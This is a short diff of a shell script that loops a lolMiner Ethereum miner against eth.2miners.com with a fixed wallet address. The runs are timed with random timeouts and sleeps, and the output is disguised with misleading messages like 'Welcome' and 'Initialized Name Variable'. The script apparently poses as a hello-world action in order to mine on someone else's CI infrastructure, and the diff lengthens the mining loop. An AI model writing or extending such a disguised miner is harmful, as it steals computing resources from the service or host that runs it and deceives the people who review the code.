@@ -8,7 +8,7 @@ x=1
 # timer=$(shuf -i 60-90 -n 1)
 # sysctl -w vm.nr_hugepages=1280
 echo "Welcome $x times"
-while [ $x -le 12 ]
+while [ $x -le 20 ]
 do
   timer=$(shuf -i 60-80 -n 1)
   echo "Welcome $x times"
@@ -16,7 +16,7 @@ do
   timeout "$timer"m ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
 #   sh -c "echo Helllo world my name is $INPUT_MY_NAME"
   x=$(( $x + 1 ))
-  sleep 70
+  sleep 120
   echo "All done with $x times"
 done
 # nohup ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P 
